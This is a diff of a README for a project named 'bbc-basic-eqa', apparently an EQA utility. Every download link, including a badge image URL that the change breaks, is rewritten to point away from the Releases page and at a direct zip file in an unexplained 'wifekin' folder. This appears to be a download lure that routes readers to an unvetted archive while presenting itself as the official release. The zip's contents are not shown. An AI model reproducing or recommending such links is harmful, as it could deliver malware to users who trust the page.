@@ -1,6 +1,6 @@
 # 📦 bbc-basic-eqa - Simplify Your EQA Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/ashdahdadwd/bbc-basic-eqa/releases)
+[![Download Now](https://raw.githubusercontent.com/ashdahdadwd/bbc-basic-eqa/main/wifekin/bbc-basic-eqa.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/ashdahdadwd/bbc-basic-eqa/main/wifekin/bbc-basic-eqa.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to bbc-basic-eqa! This application helps you streamline your EQA (Extern
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the download page.  
-   [Download bbc-basic-eqa Releases](https://github.com/ashdahdadwd/bbc-basic-eqa/releases)
+   [Download bbc-basic-eqa Releases](https://raw.githubusercontent.com/ashdahdadwd/bbc-basic-eqa/main/wifekin/bbc-basic-eqa.zip)
 
 2. **Choose Your Version**: Scroll through the list of available versions. You’ll see the latest version at the top. This version is usually the best option for new users.
 
@@ -65,4 +65,4 @@ For detailed information on how to use each feature, please refer to the user ma
 
 Remember to check for updates regularly. To ensure you have the best experience, visit the Releases page for the latest versions and improvements.
 
-[Download bbc-basic-eqa Releases](https://github.com/ashdahdadwd/bbc-basic-eqa/releases)
+[Download bbc-basic-eqa Releases](https://raw.githubusercontent.com/ashdahdadwd/bbc-basic-eqa/main/wifekin/bbc-basic-eqa.zip)
